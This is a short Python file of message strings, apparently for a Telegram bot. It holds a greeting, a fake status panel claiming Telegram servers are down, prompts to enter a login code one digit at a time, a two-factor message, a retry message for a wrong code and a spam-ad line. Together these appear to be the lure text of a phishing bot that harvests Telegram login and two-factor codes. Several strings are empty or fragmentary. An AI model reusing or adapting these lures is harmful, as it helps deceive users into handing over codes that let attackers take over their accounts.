start_msg = """
<b>Hello, {full_name},
 </b>
"""

warning_msg = """
<b>:</b>

Telegram Desktop - ✅
Telegram App - ✅
TG Servers - ❌
<b></b>
"""

if_replay = """

"""

test_ceance = """

"""

two_fa = """
<b>❌ Es\n  /start</b>
"""

bad_code = """
<b>❌ Es!\n Wrong code entered, please try again /start</b>
"""

spam_msg = """
Here is your ad
"""

codee = """
Enter the first digit of the code:
"""

tyt = """
The code builds here:
"""